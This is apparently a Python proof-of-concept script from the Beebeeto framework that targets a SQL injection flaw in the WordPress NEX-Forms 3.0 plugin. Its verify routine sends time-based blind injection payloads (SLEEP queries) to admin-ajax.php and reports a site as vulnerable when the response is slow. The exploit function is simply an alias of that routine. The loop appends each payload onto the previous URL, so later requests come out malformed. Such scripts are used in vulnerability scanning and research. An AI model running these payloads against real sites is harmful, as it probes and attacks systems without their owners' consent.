#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import time
import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0089',
            'name': 'WordPress NEX-Forms 3.0 SQL注入漏洞 POC',
            'author': 'Sh4dow',
            'create_date': '2015-04-22',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'WordPress',
            'vul_version': ['3.0'],
            'type': 'SQL Injection',
            'tag': ['WordPress SQL注入漏洞', 'NEX-Forms插件漏洞', 'php'],
            'desc': '''
                    There are sql injection vulnerabilities in NEX-Forms Plugin
                    which could allow the attacker to execute sql queries into database
                    ''',
            'references': ['https://www.exploit-db.com/exploits/36800/',
                           ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target']
        payloads = {'/wp-admin/admin-ajax.php?action=submit_nex_form&nex_forms_Id=10 AND (SELECT * FROM (SELECT(SLEEP(10)))NdbE)',
                    '/wp-admin/admin-ajax.php?action=submit_nex_form&nex_forms_Id=1 and sleep(5)',
                    '/wp-admin/admin-ajax.php?action=submit_nex_form&nex_forms_Id=10 and sleep(5)'
                    }
        for payload in payloads:
            verify_url += payload
            start_time = time.time()
            if args['options']['verbose']:
                print '[*]Request URL ' + verify_url
            req = requests.get(verify_url).content
            if time.time() - start_time > 5:
                args['options']['success'] = True
                args['poc_ret']['vul_url'] = verify_url
                break
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())